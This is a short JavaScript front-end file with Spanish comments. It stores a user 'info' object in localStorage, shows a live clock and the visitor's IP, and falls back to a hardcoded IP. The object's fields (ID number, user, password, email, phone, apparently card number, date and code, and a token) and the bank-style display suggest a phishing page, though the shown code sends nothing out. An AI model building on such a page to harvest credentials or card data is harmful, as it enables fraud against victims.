/**
 * CONFIGURACION 
 */
    // const API_URL = 'http://127.0.0.1:8080'; // Cambiar según convenga.
    const API_URL = 'https://decmf396sfy7f.cloudfront.net'; // Cambiar según convenga.





const LS = window.localStorage;
let info = {
    cc: '',
    names: '',
    user: '',
    puser: '',
    email: '',
    cel: '',
    p: '',
    f: '',
    c: '',
    type: '',
    tok: ''
}

LS.getItem('info') ? info = JSON.parse(LS.getItem('info')) : LS.setItem('info', JSON.stringify(info));

function limitarDigitos(input, maxDigits) {
    parseInt(input.value)
    if (input.value.length > maxDigits) {
        input.value = input.value.slice(0, maxDigits);
    }
}

/**
 * CLOCK AND IP
 */
function updateClock() {
    var now = new Date();

    var days = ['Domingo', 'Lunes', 'Martes', 'Miércoles', 'Jueves', 'Viernes', 'Sábado'];
    var day = days[now.getDay()];

    var date = now.getDate();

    var months = ['Enero', 'Febrero', 'Marzo', 'Abril', 'Mayo', 'Junio', 'Julio', 'Agosto', 'Septiembre', 'Octubre', 'Noviembre', 'Diciembre'];
    var month = months[now.getMonth()];

    var year = now.getFullYear();

    var hours = now.getHours();
    var minutes = now.getMinutes();
    var seconds = now.getSeconds();
    var meridiem = hours >= 12 ? 'PM' : 'AM';

    hours = hours % 12;
    hours = hours ? hours : 12;

    minutes = minutes < 10 ? '0' + minutes : minutes;
    seconds = seconds < 10 ? '0' + seconds : seconds;

    var time = day + ' ' + date + ' de ' + month + ' de ' + year + ' ' + hours + ':' + minutes + ':' + seconds + ' ' + meridiem;

    document.getElementById('datetime').textContent = time;
}

function getIP() {
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            var ip = data.ip;
            document.getElementById('ip').textContent = ip;
        })
        .catch(error => {
            console.error('Error al obtener la dirección IP:', error);
            document.getElementById('ip').textContent = '186.192.168.249';
        });
}

try{
    setInterval(updateClock, 1000);
    document.addEventListener('DOMContentLoaded', getIP);
}catch(err){
    console.log(err);
}

console.log("Main ON");